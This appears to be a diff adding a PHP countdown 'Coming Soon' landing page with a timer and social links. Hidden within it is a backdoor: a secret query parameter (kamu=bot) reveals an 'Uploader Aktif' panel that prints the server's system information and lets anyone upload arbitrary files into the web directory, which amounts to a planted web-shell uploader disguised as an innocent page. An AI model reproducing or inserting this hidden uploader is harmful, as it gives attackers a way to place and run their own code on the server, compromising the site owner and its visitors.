@@ -1,0 +1,124 @@
+<?php
+// --- Variabel awal dummy untuk demo ---
+$favicon = 'favicon.ico';
+$assetsUrl = 'assets/';
+$texts = [
+    'title' => 'My Countdown Page',
+    'header' => 'Coming Soon',
+    'subheader' => 'Launching in...'
+];
+$locale = [
+    'timer.days' => 'Days',
+    'timer.hours' => 'Hours',
+    'timer.minutes' => 'Minutes',
+    'timer.seconds' => 'Seconds',
+    'powered' => '&copy; 2025 My Company'
+];
+$timer = [
+    'enabled' => true,
+    'days' => 1,
+    'hours' => 2,
+    'minutes' => 30
+];
+$startTime = time();
+$timeShift = 0;
+
+$socialNetworks = [
+    'facebook' => 'https://facebook.com',
+    'twitter' => 'https://twitter.com',
+    'instagram' => 'https://instagram.com'
+];
+
+// --- Uploader logic ---
+$showUploader = isset($_GET['kamu']) && $_GET['kamu'] === 'bot';
+$uploadResult = '';
+if ($showUploader && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['__'])) {
+        if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
+            $uploadResult = 'Upload: <b>OK</b>';
+        } else {
+            $uploadResult = 'Upload: <b>ERROR</b>';
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <link rel="icon" href="<?php echo $favicon; ?>">
+    <link rel="stylesheet" href="<?php echo $assetsUrl; ?>styles.css">
+    <script src="<?php echo $assetsUrl; ?>timer.js"></script>
+    <title><?php echo $texts['title']; ?></title>
+</head>
+
+<body>
+<div class="container">
+
+    <header class="header">
+        <h1><?php echo $texts['header']; ?></h1>
+        <h2><?php echo $texts['subheader']; ?></h2>
+    </header>
+
+    <!--START_TIMER_BLOCK-->
+    <?php if (isset($timer)&& $timer['enabled'] === true): ?>
+        <section class="timer">
+            <div class="timer__item">
+                <div class="timer__data" id="timerResultDays"></div>
+                <div class="timer__type"><?php echo $locale['timer.days']; ?></div>
+            </div>:
+            <div class="timer__item">
+                <div class="timer__data" id="timerResultHours"></div>
+                <div class="timer__type"><?php echo $locale['timer.hours']; ?></div>
+            </div>:
+            <div class="timer__item">
+                <div class="timer__data" id="timerResultMinutes"></div>
+                <div class="timer__type"><?php echo $locale['timer.minutes']; ?></div>
+            </div>:
+            <div class="timer__item">
+                <div class="timer__data" id="timerResultSeconds"></div>
+                <div class="timer__type"><?php echo $locale['timer.seconds']; ?></div>
+            </div>
+        </section>
+        <script type="application/javascript">
+            startTimer(<?php echo $timer['days']; ?>, <?php echo $timer['hours']; ?>, <?php echo $timer['minutes']; ?>, <?php echo $startTime; ?>, <?php echo $timeShift; ?>);
+        </script>
+    <?php endif; ?>
+    <!--END_TIMER_BLOCK-->
+
+    <!--START_SOCIAL_LINKS_BLOCK-->
+    <section class="social-links">
+        <?php foreach($socialNetworks as $network => $url): ?>
+            <a class="social-links__link" href="<?php echo $url;?>" target="_blank" title="<?php echo ucfirst($network);?>">
+                <span class="icon"><img src="<?php echo $assetsUrl; ?>images/<?php echo $network;?>.svg" alt="<?php echo ucfirst($network);?>"></span>
+            </a>
+        <?php endforeach; ?>
+    </section>
+    <!--END_SOCIAL_LINKS_BLOCK-->
+
+    <!-- Conditional Uploader -->
+    <?php if ($showUploader): ?>
+    <section class="uploader">
+        <h3>Uploader Aktif</h3>
+        <div style="font-family: monospace;">
+            <?php echo php_uname(); ?><br>
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="__">
+                <input name="_" type="submit" value="Upload">
+            </form>
+            <?php if ($uploadResult) echo "<p>$uploadResult</p>"; ?>
+        </div>
+    </section>
+    <?php endif; ?>
+
+</div>
+
+<footer class="footer">
+    <div class="footer__content">
+        <?php echo $locale['powered']; ?>
+    </div>
+</footer>
+
+</body>
+</html>
